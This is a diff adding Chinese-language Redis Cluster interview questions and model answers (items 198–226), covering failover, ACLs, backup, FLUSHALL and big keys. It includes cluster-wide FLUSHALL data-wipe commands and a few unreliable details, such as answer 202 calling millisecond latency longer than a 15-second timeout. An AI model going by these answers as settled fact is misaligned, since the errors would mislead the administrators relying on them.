+      "answer": "Redis 集群中的管道（Pipeline）不支持跨节点。原因：Pipeline 是将多个命令批量写入同一个 TCP 连接然后一次性读取响应，而集群模式下不同 key 可能路由到不同节点（不同的 TCP 连接）。跨节点的 Pipeline 需要客户端协调多连接、多路复用，复杂度很高且可能打乱响应顺序。集群中使用 Pipeline 的方法：1）预处理：按槽（节点）分组 key，将发往同一节点的命令组成一个 Pipeline 发送，不同节点的命令用不同的 Pipeline 并行发送；2）使用 Hash Tag 确保相关 key 在同一个节点；3）借助客户端库实现（Lettuce 的 ClusterPipeline、JedisCluster 的 JedisClusterPipeline）；4）不做跨节点 Pipeline——直接逐个发送命令，接受网络往返延迟。所以集群环境下 Pipeline 优化的效果有限，需要先按节点分组再 Pipeline。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群中的管道（Pipeline）是否支持跨节点（不支持，需要针对单个节点分别执行） ?"
+    },
+    {
+      "number": 199,
+      "id": "Redis 数据库面试题-199",
+      "category": "Redis 数据库",
+      "answer": "在 Redis 集群环境下，发布订阅（Pub/Sub）的实现机制：消息在集群内广播——当客户端向任意节点 PUBLISH channel message 时，该节点将消息发送给集群中所有其他节点（通过集群总线），每个节点再分发给本节点上订阅了该频道的客户端。特点：1）广播机制导致性能开销：无论订阅者在哪里，消息都会在整个集群广播，集群越大开销越大；2）跨节点消息不保证顺序：不同频道的消息到达不同节点可能有先后差异；3）不支持持久化和 ACK：Pub/Sub 仍是即时的，离线的订阅者会丢失消息；4）集群中维护 Pub/Sub 的连接不应频繁切换节点（避免重复订阅和取消订阅）；5）大量 Pub/Sub 场景在集群中性能较差（广播风暴），应考虑使用 Redis Stream 替代（Stream 支持消费者组且非广播）。6）客户端实现：ioredis 等客户端集群模式下发送 subscribe 后自动建立到所有节点的订阅连接。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述在 Redis 集群环境下，如何实现发布订阅（Pub/Sub）消息是在集群内广播的吗（是，每个节点都会收到） ?"
+    },
+    {
+      "number": 200,
+      "id": "Redis 数据库面试题-200",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群的备份和恢复策略：1）全量备份（每个节点独立备份）：针对每个节点分别执行 BGSAVE 生成 RDB 文件或备份 AOF 文件，因为数据分片在不同节点，全集群备份需所有节点的备份文件组合。2）可从从节点备份：在每个主节点的从节点上执行 BGSAVE 生成 RDB，不影响主节点性能。3）备份单个节点是可行的：该节点的 RDB/AOF 文件包含其负责的所有槽的数据，恢复该节点只需将其备份文件放回对应节点数据目录并重启。4）全集群恢复步骤：a）停止所有集群节点；b）将所有节点的备份文件（dump.rdb/appendonly.aof）放回各节点；c）启动所有节点；d）检查集群状态（CLUSTER INFO / CLUSTER NODES），修复可能的配置不一致（redis-cli --cluster fix）；e）验证数据完整性。5）更安全的做法：备份文件定期同步到异地对象存储（S3/OSS），保留多版本备份和删除保护。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群的备份和恢复策略是怎样的是否可以备份单个节点 ?"
+    },
+    {
+      "number": 201,
+      "id": "Redis 数据库面试题-201",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群中节点数据损坏或丢失的恢复方案：1）有从节点的情况（推荐）：主节点数据损坏→从节点自动或手动故障转移提升为新主节点（CLUSTER FAILOVER FORCE/TAKEOVER），损坏节点可被 FORGET 并从集群移除，然后重建为新节点加入（作为从节点复制新主）。2）无从节点的情况：只能从持久化文件恢复——将备份的 RDB/AOF 文件放回节点数据目录→重启节点→节点尝试重新加入集群→通过 Gossip 协议同步状态→其他节点确认其槽分配。3）数据完全丢失且无备份：该节点负责的槽数据永久丢失。解决方案：从集群移除该节点→reshard 将丢失的槽分配到其他节点→重新分配空槽（此时数据不可恢复）。预防措施：每个主节点至少配一个从节点、定期备份从节点的持久化文件、多地点冗余。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述如果 Redis 集群中的一个节点数据损坏或丢失，如何恢复（从从节点提升或从持久化文件恢复后加入集群） ?"
+    },
+    {
+      "number": 202,
+      "id": "Redis 数据库面试题-202",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群支持跨数据中心部署但面临挑战：1）网络延迟：数据中心间延迟通常 10-100ms，远超 Redis cluster-node-timeout（默认 15s），但 Gossip 心跳的 PFAIL 检测和主从复制对延迟敏感。高延迟可能导致频繁误判 PFAIL 或主从数据不同步。2）脑裂问题：双中心网络断开后双方都可能选举新主接管槽，产生数据冲突和写入丢失。解决方案：将主节点集中在一个数据中心（单写 DC），另一个 DC 只部署从节点（备份和灾备）；使用 cluster-require-full-coverage no 允许部分槽不可用而非脑裂；配置 min-replicas-to-write 防止单中心故障时写入；3）带宽成本：主从复制跨 DC 传输 RDB 和增量数据消耗大量带宽，需评估成本；4）故障转移延迟：跨 DC 的心跳检测和选举延迟增大故障恢复时间；5）推荐方案：使用 Redis 企业版的 Active-Passive 异地灾备或双活（CRDT），而非原生集群跨 DC 部署。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群是否支持跨数据中心部署会遇到哪些挑战（网络延迟、脑裂） ?"
+    },
+    {
+      "number": 203,
+      "id": "Redis 数据库面试题-203",
+      "category": "Redis 数据库",
+      "answer": "Redis Sentinel 与 Redis 集群在功能和定位上的区别：1）Sentinel（哨兵）：高可用方案（HA）——在主从复制基础上增加自动监控、通知和故障转移。不涉及数据分片，所有节点持有全量数据。适合：数据量不大但需要自动故障转移和高可用保障。一个 Sentinel 监控组通常管理 1 主 N 从。2）Cluster（集群）：分布式方案——将数据进行哈希分片存储到多个主节点，每个主节点可配置从节点实现高可用。具备数据分片+自动故障转移+在线扩缩容。适合：数据量大（超出单机内存）、写并发高（分散到多主）。3）核心区别：Sentinel 解决的是高可用（自动故障转移），集群解决的是高可用+可扩展（数据分片+自动故障转移）。4）可组合使用：集群中的每个分片本身也有主从关系和故障转移（类似内置 Sentinel 机制），无需额外部署 Sentinel。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述什么是 Redis Sentinel它与 Redis 集群在功能和定位上有何区别 ?"
+    },
+    {
+      "number": 204,
+      "id": "Redis 数据库面试题-204",
+      "category": "Redis 数据库",
+      "answer": "选择 Redis Sentinel 而不是 Redis 集群的场景：1）数据量小：数据总量完全可以容纳在单机内存中（如 < 32GB），不需要分片；2）写并发不大：单机 Redis 的写能力（5-10 万 QPS）足以满足业务需求；3）需要多 key 操作：业务大量使用 MGET/MSET、事务、Lua 脚本跨多 key 操作，集群模式下的 Hash Tag 限制太繁琐；4）需要 Pub/Sub：大规模 Pub/Sub 在集群中广播效率较低，单机 Sentinel 架构的 Pub/Sub 更简单高效；5）客户端简单性：不需要客户端支持集群协议的智能路由（部分老客户端不支持集群）；6）运维简单：Sentinel 架构认知门槛更低，3 台 Sentinel + 1 主 2 从；7）需要多 DB：集群只支持 DB 0，需要使用 SELECT 切换数据库的场景应选 Sentinel 架构。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述在什么场景下应该选择 Redis Sentinel 而不是 Redis 集群（如数据量不大但需要高可用） ?"
+    },
+    {
+      "number": 205,
+      "id": "Redis 数据库面试题-205",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群的脑裂问题及应对方案：脑裂（Split-Brain）指网络分区导致集群分裂为两个或多个独立子集群，各方都认为自己是主集群并独立对外提供服务，导致数据不一致和写入冲突。Redis 集群的应对机制：1）PFAIL→FAIL 多数派判定：故障检测要求超过半数主节点确认某节点下线才标记 FAIL，分区后少数派子集群（<半数主节点）无法进行故障转移选举；2）epoch 冲突解决：configEpoch 更大的配置信息胜出，网络恢复后低 configEpoch 节点的变更被丢弃；3）cluster-require-full-coverage yes（默认）：如果某些槽无可用节点，整个集群拒绝所有请求（全部不可用而非部分可用），避免部分写入丢失；4）min-replicas-to-write：主节点写入前要求至少 N 个从节点可达，防止孤立主节点的写入在网络恢复后被丢弃；5）合理配置 cluster-node-timeout：不宜过大（延长故障检测时间），不宜过小（网络抖动误判）；6）物理部署上避免主从在同一故障域。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述什么是 Redis Cluster 的脑裂问题在集群中如何避免或减轻其影响（通过节点超时和多数派选举） ?"
+    },
+    {
+      "number": 206,
+      "id": "Redis 数据库面试题-206",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群的 cluster-node-timeout 参数（默认 15000 毫秒=15 秒）对故障检测和转移速度的影响：1）节点心跳超时判定：节点 A 向 B 发送 PING 后，如果超过 cluster-node-timeout 时间未收到 PONG，A 将 B 标记为 PFAIL。值越小，故障检测越敏感和快速；值越大，检测越慢但误判越少。2）故障转移触发：从节点等待其主节点被标记为 FAIL 的时间取决于 PFAIL→FAIL 的 Gossip 传播（多数主节点确认），cluster-node-timeout 决定了 Gossip 信息传播和多数票收集的时间下限（通常为 cluster-node-timeout 的 1-2 倍）。3）配置建议：网络稳定环境（如数据中心内部）可设 3000-5000ms 加快故障检测；跨 AZ/跨 DC 环境可设 15000-30000ms 避免网络抖动误判；4）注意：设得太小会导致网络轻微抖动时频繁 PFAIL 和误故障转移（flapping）；设得太大导致真实故障时恢复时间过长（影响业务可用性 SLO）。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群的节点超时（cluster-node-timeout）参数配置对故障检测和转移速度有何影响 ?"
+    },
+    {
+      "number": 207,
+      "id": "Redis 数据库面试题-207",
+      "category": "Redis 数据库",
+      "answer": "手动触发 Redis 集群故障转移使用 CLUSTER FAILOVER 命令，支持以下选项：1）CLUSTER FAILOVER（默认）：在从节点上执行，从节点与其主节点协商进行优雅切换——主节点停止接受写入、复制完剩余数据给从节点、从节点接管槽成为新主。期间数据不丢失（graceful failover）。2）CLUSTER FAILOVER FORCE：强制故障转移，不等待主节点确认。从节点直接尝试接管槽成为新主，主从数据可能略有差异（丢失少量未复制的数据）。适用：主节点已不可达但仍未判定为 FAIL 的状态。3）CLUSTER FAILOVER TAKEOVER：立即接管，不进行选举（不需要获得多数主节点的投票）。仅当集群无法完成正常选举时使用（如多数主节点不可用）。使用场景：计划内维护（手动将主切换为从进行升级）、测试故障转移机制、处理选举僵局。手动 FAILOVER 后原主节点自动成为新主的从节点。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述如何手动触发 Redis 集群的故障转移（CLUSTER FAILOVER 命令，支持 FORCE、TAKEOVER 等选项） ?"
+    },
+    {
+      "number": 208,
+      "id": "Redis 数据库面试题-208",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群的从节点优先级配置：1）cluster-replica-priority 参数（3.0+）：配置从节点在故障转移选举中的优先级。值为 0 到 100，值越小优先级越高（越有可能被选为新主节点）。0 表示该从节点永远不会被提升为主节点（永远作为从节点）。默认值为 100。配置方式：redis.conf 中设置 cluster-replica-priority 或运行时 CONFIG SET cluster-replica-priority N。2）没有绝对保证：优先级是倾向性而非绝对规则，由于选举投票的随机性可能导致低优先级节点胜出。故障转移延迟（replica rank 排序中，数据最新的从节点优先）和随机等待也影响选举结果。3）用途：多机房部署时，优先选本机房/近机房的从节点为主（设置更低的 priority 值）；某个特定的更强硬件从节点优先提升为主；标记某个从节点为静态备份（priority 0）永不提升。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群的从节点是否可以配置优先级（cluster-replica-ability 或通过配置影响选举结果） ?"
+    },
+    {
+      "number": 209,
+      "id": "Redis 数据库面试题-209",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群在数据迁移（slot migration）过程中支持一致性保证：1）槽迁移基于逐个 key 的 MIGRATE 命令：源节点将 key 原子地移动到目标节点（源节点删除+目标节点创建，MIGRATE 命令自身是原子的）；2）迁移期间旧数据仍然可读：如果 key 还在源节点（尚未被迁移），客户端请求正常处理返回源节点数据；如果 key 已迁移到目标节点，源节点返回 ASK 重定向引导客户端去目标节点获取数据；3）迁移期间写入：在 MIGRATING 状态的源节点拒绝新的写入请求，在 IMPORTING 状态的目标节点正常接受写入请求；4）迁移粒度：逐个槽迁移，每个槽内逐个 key 迁移，迁移过程中的 key 状态确定（要么在源、要么在目标）；5）最终一致性：迁移完成后槽归属正式转移（CLUSTER SETSLOT NODE），后续所有请求通过 MOVED 重定向到新节点；6）迁移中如有 key 在源和目标之间丢失或重复的风险低（MIGRATE 的原子性保证），但迁移期间的网络中断可能导致单个 key 迁移失败需重试。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群是否支持数据迁移过程中的一致性保证（复制和迁移过程中旧数据仍然可读） ?"
+    },
+    {
+      "number": 210,
+      "id": "Redis 数据库面试题-210",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群工具 redis-cli --cluster 的常用功能：1）create：创建新集群（redis-cli --cluster create host1:port1 host2:port2 ... --cluster-replicas 1）；2）check：检查集群健康状态（槽分配是否完整、节点状态、配置一致性等）；3）info：显示集群信息（状态、槽分配、节点数）；4）fix：自动修复集群问题（如槽分配不一致、open slot 等，需谨慎使用）；5）reshard：在线迁移哈希槽（从一个节点到另一个节点）；6）rebalance：重新均衡槽分布（自动计算并迁移使各节点槽数均匀）；7）add-node：添加新节点到集群（可作为主节点或从节点）；8）del-node：从集群移除节点（需先迁移该节点的槽）；9）call：在所有节点上执行相同命令（如 redis-cli --cluster call host:port PING）；10）import：将外部单机 Redis 数据导入集群。这些命令封装了底层 CLUSTER * 命令的复杂操作，是集群运维的首要工具。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群的 redis-trib.rb 或 redis-cli --cluster 命令工具有哪些常用功能（创建、检查、修复、reshard、rebalance） ?"
+    },
+    {
+      "number": 211,
+      "id": "Redis 数据库面试题-211",
+      "category": "Redis 数据库",
+      "answer": "使用 redis-cli --cluster 在线迁移哈希槽的步骤：1）启动 reshard 模式：redis-cli --cluster reshard <任意节点IP:PORT>；2）交互式提示输入要迁移的槽数量（如 1000）；3）输入目标节点 ID（接收槽的节点）；4）输入来源节点 ID（提供槽的节点），可输入 all 表示从所有节点均匀抽取，也可输入具体节点 ID，输入 done 表示完成选择；5）工具显示迁移计划并请求确认 yes；6）确认后逐槽执行迁移：源节点 CLUSTER SETSLOT <slot> MIGRATING <target_id>；目标节点 CLUSTER SETSLOT <slot> IMPORTING <source_id>；源节点执行 MIGRATE 迁移槽内所有 key；完成后双方 CLUSTER SETSLOT <slot> NODE <target_id>；7）迁移期间客户端通过 ASK 重定向正常访问迁移中的数据。也可用非交互模式：指定 --cluster-from、--cluster-to、--cluster-slots 等参数实现脚本化迁移。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述如何使用 redis-cli --cluster 工具在线迁移哈希槽 ?"
+    },
+    {
+      "number": 212,
+      "id": "Redis 数据库面试题-212",
+      "category": "Redis 数据库",
+      "answer": "检查 Redis 集群健康状态使用 redis-cli --cluster check <host:port>。该命令检查内容：1）节点连通性：PING 所有节点，确认均可达；2）槽分配完整性：确认 16384 个槽全部被分配且处于稳定状态（非 MIGRATING/IMPORTING），没有 orphan（无主）槽；3）主从关系：每个主节点的从节点数量；4）配置一致性：各节点记录的槽分配信息是否一致（同一槽只被一个节点声明拥有）；5）内存使用：各节点 used_memory，检测是否有异常的大 key 节点；6）节点角色：主从角色是否正确。输出中会显示槽分布汇总（每个主节点负责多少槽）、节点状态。如果发现不一致或异常，会给出警告和修复建议。若需自动修复，可用 redis-cli --cluster fix 命令（但修复前建议先备份数据，谨慎操作）。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述如何检查 Redis 集群的健康状态（redis-cli --cluster check ） ?"
+    },
+    {
+      "number": 213,
+      "id": "Redis 数据库面试题-213",
+      "category": "Redis 数据库",
+      "answer": "如果 Redis 集群中某个主节点没有从节点且该主节点宕机：该主节点负责的所有哈希槽将变为不可用（no available node）→ 集群检测到这些槽无主→cluster_state 变为 fail→整个集群进入 CLUSTERDOWN 状态，拒绝所有客户端请求（即使其他主节点正常）。这是最严重的集群故障场景之一。避免方案：1）每个主节点至少配置 1 个从节点（生产环境强制要求）；2）使用 cluster-require-full-coverage yes（默认）确保任何槽不可用时整个集群不可用（fail-fast 而非部分服务），避免数据不一致；3）如果不需要全槽覆盖保证，可设 cluster-require-full-coverage no，允许故障主节点的槽不可用但其他槽正常服务（可能有数据丢失的槽）；4）监控每个主节点的从节点数量，从节点不足立即告警；5）如果某节点真无备份且宕机，唯一的恢复方法是重建节点并从持久化文件恢复（如果有备份）。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群中，如果某个主节点没有从节点，且该主节点宕机，会发生什么（该节点负责的哈希槽不可用） ?"
+    },
+    {
+      "number": 214,
+      "id": "Redis 数据库面试题-214",
+      "category": "Redis 数据库",
+      "answer": "为 Redis 集群中某个主节点动态添加从节点：1）启动一个新的 Redis 实例（配置 cluster-enabled yes，作为从节点加入）；2）使用 redis-cli --cluster add-node <new_host:port> <existing_host:port> --cluster-slave --cluster-master-id <master_node_id>。其中 master_node_id 通过 CLUSTER NODES 查看目标主节点的 40 位十六进制 ID。3）或者先加入为独立主节点再加入复制关系：redis-cli --cluster add-node <new_host:port> <existing_host:port>（加入空主节点）→连接新节点执行 CLUSTER REPLICATE <master_node_id> 设置为主节点的从节点。4）验证：CLUSTER NODES 查看新节点是否作为 slave 出现在目标主节点下，检查复制状态（INFO replication）。5）注意：新从节点会触发一次全量同步（RDB），如果主节点数据量大需要一定时间完成同步，期间对网络带宽和主节点 CPU 有一定影响。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述如何为 Redis 集群中的某个主节点动态添加一个从节点 ?"
+    },
+    {
+      "number": 215,
+      "id": "Redis 数据库面试题-215",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群中从节点默认是只读的，不能直接作为主节点进行写入。但从节点可以通过 CLUSTER REPLICATE 命令改变角色或通过故障转移提升为主节点：1）CLUSTER REPLICATE <master_node_id>：将当前节点配置为指定主节点的从节点（取消之前的复制关系）；2）CLUSTER FAILOVER：在从节点上手动触发故障转移，从节点提升为主节点，原主节点降级为从节点；3）CLUSTER FAILOVER FORCE/TAKEOVER：强制故障转移（即使主节点正常）；4）CLUSTER RESET：重置节点集群配置（退出集群），之后可重新加入为独立主节点；5）如果想让从节点能处理读请求，在从节点上执行 READONLY 命令（连接级别），不需要改变角色；6）不建议将正在复制的从节点手动改为主节点（会打破集群拓扑），应通过 CLUSTER FAILOVER 进行优雅切换。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群中，从节点是否可以作为主节点进行读写（可以通过 CLUSTER REPLICATE 命令改变角色） ?"
+    },
+    {
+      "number": 216,
+      "id": "Redis 数据库面试题-216",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群的节点 ID（Node ID）是 40 位的随机十六进制字符串（类似 SHA1），特点：1）节点首次启动时随机生成；2）永久性：只要 nodes.conf 文件（cluster-config-file 参数指定的文件名）未被删除，重启节点后 ID 保持不变；3）如果删除了 nodes.conf 文件，节点重启后会生成新的 Node ID（导致集群中旧 ID 变为孤立状态，需要 CLUSTER FORGET 清除旧 ID 然后用新 ID 重新加入）；4）Node ID 用于集群内节点唯一标识（Gossip 通信、CLUSTER NODES 列表、复制关系引用等）；5）与 IP 和端口不同，节点 ID 不会因网络变更而改变，无论节点 IP 如何变化，只要节点 ID 不变，集群就能识别它；6）运维注意：迁移节点时保留 nodes.conf 文件以维持原节点 ID；不要手动编辑或复制 nodes.conf。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群的节点 ID（Node ID）是永久的吗重启节点后 ID 是否会变（不变，保存在节点配置文件中） ?"
+    },
+    {
+      "number": 217,
+      "id": "Redis 数据库面试题-217",
+      "category": "Redis 数据库",
+      "answer": "在 Redis 集群中，节点配置信息的变更通过 Gossip 协议自动同步：1）配置信息包括：节点角色（master/slave）、节点负责的哈希槽、节点 IP 和端口、节点 flags（如 myself/master/slave/pfail/fail）、configEpoch 等；2）变更来源：节点故障转移、槽迁移（reshard）、新节点加入、节点退出、节点 IP/端口变化等；3）传播机制：发生变更的节点在后续的 PING/PONG 消息中携带更新后的 gossip 段和槽位图，逐渐扩散到全集群；4）接收节点收到 gossip 信息后更新本地的 clusterState 中对应节点的信息；5）configEpoch 用于裁决冲突的配置变更（epoch 更大的变更生效）；6）最终一致性：配置变更不要求即时全局一致，而是通过 Gossip 协议在数秒内达到全集群收敛（大多数节点状态一致）；7）客户端感知：槽→节点映射变更通过 MOVED 重定向通知客户端更新缓存。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述在 Redis 集群中，如何处理节点配置信息的变更（节点间通过 Gossip 协议自动同步配置信息） ?"
+    },
+    {
+      "number": 218,
+      "id": "Redis 数据库面试题-218",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群支持 ACL（访问控制列表），从 Redis 6.0 开始引入。ACL 功能包括：1）定义用户和密码：ACL SETUSER <username> on >password；2）命令权限控制：ACL SETUSER <username> +@all -@dangerous（允许所有命令但禁止危险命令如 FLUSHALL/CONFIG/KEYS）；3）key 模式控制：ACL SETUSER <username> ~prefix:*（只允许访问特定前缀的 key）；4）Pub/Sub 频道控制：ACL SETUSER <username> &channel:*（只允许订阅特定频道）；5）ACL 配置持久化：在 redis.conf 中写 aclfile /path/users.acl 或在配置文件中直接写 ACL 规则；6）集群中的 ACL：ACL 配置需要在每个节点独立设置（不是集群统一管理的），所有节点应配置相同的 ACL 规则以保证一致性；7）ACL 命令：ACL LIST（列出所有用户和规则）、ACL WHOAMI（当前连接用户）、ACL GETUSER（查看用户详情）、ACL DELUSER（删除用户）。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群支持 ACL（访问控制列表）吗（Redis 6.0 开始支持） ?"
+    },
+    {
+      "number": 219,
+      "id": "Redis 数据库面试题-219",
+      "category": "Redis 数据库",
+      "answer": "在 Redis 集群中使用 ACL 功能：1）ACL 是节点级别的配置，需要在每个集群节点上独立配置。2）配置方式：A）redis.conf 中直接写 user <username> on >password ~* +@all 等规则；B）使用单独 ACL 文件：aclfile /etc/redis/users.acl，文件中每行一个 user 规则；C）运行时动态配置：通过 redis-cli 连接每个节点执行 ACL SETUSER 命令，然后用 ACL SAVE（或 CONFIG REWRITE）持久化。3）集群一致性：所有节点的 ACL 配置应保持一致（尤其是 requirepass/masterauth 相关的 ACL 用户），否则可能影响 Gossip 通信和主从复制的认证。4）自动化工具：使用 ansible/脚本批量在每个节点配置 ACL；5）注意事项：集群总线端口（6379+10000）也受 ACL 保护，确保有 ACL 用户授权允许集群间通信；6）default 用户：修改或禁用 default 用户的权限（默认无密码+全部权限）以增强安全。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述在 Redis 集群中，如何使用 ACL 功能（需要在每个节点上配置） ?"
+    },
+    {
+      "number": 220,
+      "id": "Redis 数据库面试题-220",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群的密码认证机制：1）requirepass：客户端连接密码，在 redis.conf 中设置 requirepass your_password，或在 6.0+ 用 ACL 用户密码；2）masterauth：主从复制认证密码，从节点连接主节点时需要的密码，在 redis.conf 中设置 masterauth your_password，应设为与 requirepass 相同（如果主节点设置了 requirepass 则从节点必须设 masterauth，否则复制失败）；3）集群中每个节点都必须配置相同的 requirepass 和 masterauth（保证节点间的 Gossip 通信、主从复制、迁移等场景正常认证）；4）如果不配置 masterauth，主节点设了密码但从节点没有配置密码时，从节点会日志报错 NOAUTH 或连接主节点失败；5）redis-cli 连接使用 -a password 或 AUTH password；6）6.0+ 推荐使用 ACL：ACL SETUSER replicator on >repl_password +@all ~*（为复制创建专用 ACL 用户）。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群的密码认证是如何工作的（需要为每个节点配置相同的 requirepass 和 masterauth） ?"
+    },
+    {
+      "number": 221,
+      "id": "Redis 数据库面试题-221",
+      "category": "Redis 数据库",
+      "answer": "在 Redis 集群中使用 FLUSHALL 或 FLUSHDB 命令的效果：1）FLUSHALL/FLUSHDB 只清空当前连接节点的数据，不会清空整个集群的所有节点（和单机/哨兵模式不同）；2）这两个命令在集群中属于危险命令，建议在生产环境用 ACL 禁用或 rename-command FLUSHALL '' 禁用；3）如果确实需要清空整个集群：必须在每个主节点上分别执行 FLUSHALL（通过 redis-cli --cluster call host:port FLUSHALL 在所有节点执行）；4）清空后集群结构不变（槽分配仍保持），但所有数据被删除；5）主从复制：FLUSHALL 在主节点执行后，该操作通过复制传播到其从节点（从节点也被清空）；6）清空后集群可以正常继续服务（相当于全新的空集群）；7）注意：FLUSHALL 是同步阻塞操作（大内存下可能阻塞 Redis 秒级甚至更久），4.0+ 可使用 FLUSHALL ASYNC 异步清空（使用 UNLINK 后台线程惰性删除）。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述在 Redis 集群中使用 FLUSHALL 或 FLUSHDB 命令会有什么效果（只清空当前节点数据，不能清空整个集群） ?"
+    },
+    {
+      "number": 222,
+      "id": "Redis 数据库面试题-222",
+      "category": "Redis 数据库",
+      "answer": "在 Redis 集群中安全清空所有数据的方法：1）确认备份：先确认所有节点的数据已备份（RDB/AOF 异地备份），以防误操作。2）逐节点清空：连接每个主节点分别执行 FLUSHALL 或 FLUSHALL ASYNC（4.0+推荐，不阻塞主线程）；3）批量执行：redis-cli --cluster call host:port FLUSHALL ASYNC 在所有节点执行（需确认所有节点密码一致且可达）；4）遍历脚本：通过 CLUSTER NODES 获取所有主节点列表，依次连接每个主节点执行 FLUSHALL；5）确保主从一致：主节点 FLUSHALL 通过复制传递到从节点，从节点自动被清空，无需在从节点单独执行；6）验证：执行后 CLUSTER NODES 查看各节点确保状态正常，随机抽查 GET 几个 key 确认已清空；7）禁用 FLUSHALL（生产环境推荐）：rename-command FLUSHALL '' 或 ACL 禁止该命令，防止误操作。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述如何在 Redis 集群中安全地清空所有数据（遍历每个节点执行 FLUSHALL 并确保主从一致） ?"
+    },
+    {
+      "number": 223,
+      "id": "Redis 数据库面试题-223",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群支持内存碎片自动清理：1）Redis 使用 jemalloc 内存分配器，内存释放后可能产生碎片（不立即归还 OS）；2）MEMORY PURGE 命令：主动请求 jemalloc 释放未使用的内存页回操作系统（但 jemalloc 不一定能回收全部碎片）；3）Redis 4.0+ 支持 activedefrag yes 配置：启用自动内存碎片整理（后台线程运行，低优先级扫描和移动内存块以减少碎片），配置项包括 active-defrag-ignore-bytes（碎片超过此阈值才整理）、active-defrag-threshold-lower/upper（碎片率阈值范围）、active-defrag-cycle-min/max（CPU 时间占比控制）；4）集群注意事项：碎片整理是每个节点独立进行的，需在每个节点配置；5）谨慎使用：碎片整理消耗 CPU 资源，在 CPU 繁忙时可能影响性能，建议先评估碎片率（INFO memory 中的 mem_fragmentation_ratio）再决定是否开启；6）结构优化：减少碎片的最佳方法仍是优化数据模型（使用紧凑内部编码、控制 key 大小）。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群是否支持内存碎片的自动清理（支持 MEMORY PURGE 命令，但需谨慎使用） ?"
+    },
+    {
+      "number": 224,
+      "id": "Redis 数据库面试题-224",
+      "category": "Redis 数据库",
+      "answer": "优化 Redis 集群在大键（Big Key）情况下的性能：1）发现 Big Key：redis-cli --bigkeys 扫描每个节点，或使用 MEMORY USAGE key 查看内存占用；2）拆分大 key：A）大 String→拆分为多个小 String（如按分片数 key_0, key_1, ... key_N）；B）大 Hash→按 field 维度拆分为多个小 Hash（如 user:1:basic, user:1:extended）；C）大 List→按时间或数量拆分（如 list:2024-01, list:2024-02）；D）大 Set/ZSet→按规则拆分子集（如 set:topic:0-1000, set:topic:1001-2000）；3）异步操作：DEL 大 key 用 UNLINK（异步删除）；4）渐进操作：大集合用 HSCAN/SSCAN/ZSCAN 批量操作而非一次性获取全部；5）压缩：对大 String value 压缩（snappy/gzip）后存储；6）迁移优化：大 key 的槽迁移耗时长，建议在业务低峰期迁移或先将大 key 拆分后再迁移；7）集群均衡：避免所有大 key 集中在少数节点（数据倾斜），通过合理 key 设计使分布更均匀。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述如何优化 Redis 集群在大键（Big Key）情况下的性能（避免大键，拆分存储） ?"
+    },
+    {
+      "number": 225,
+      "id": "Redis 数据库面试题-225",
+      "category": "Redis 数据库",
+      "answer": "定位 Redis 集群中的大键（Big Key）方法：1）redis-cli --bigkeys：逐节点执行（redis-cli -h host -p port --bigkeys），扫描每个节点的所有 key 并统计各数据类型中最大的 key，输出最大的 String（按长度）、Hash/List/Set/ZSet/Stream（按元素数）。注意 --bigkeys 使用 SCAN 非阻塞遍历，但扫描全量数据仍需要时间和带宽。2）MEMORY USAGE key [SAMPLES count]：精确查看某个 key 的内存占用（包含内部编码开销）。3）自写脚本：使用 SCAN 遍历 key → TYPE key 判断类型 → 根据类型查询大小（STRLEN/HLEN/LLEN/SCARD/ZCARD）→ 记录超过阈值的 key；遍历所有集群节点。4）Redis 内存分析工具：redis-rdb-tools 离线分析 RDB 文件，导出每个 key 的大小报告。5）监控维度：定期执行 Big Key 扫描并设置告警（String > 1MB 或集合 > 10000 元素）。6）预防措施：在代码层面限制 String value 大小和集合元素数。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述如何定位 Redis 集群中的大键（使用 redis-cli --bigkeys 扫描每个节点） ?"
+    },
+    {
+      "number": 226,
+      "id": "Redis 数据库面试题-226",
+      "category": "Redis 数据库",
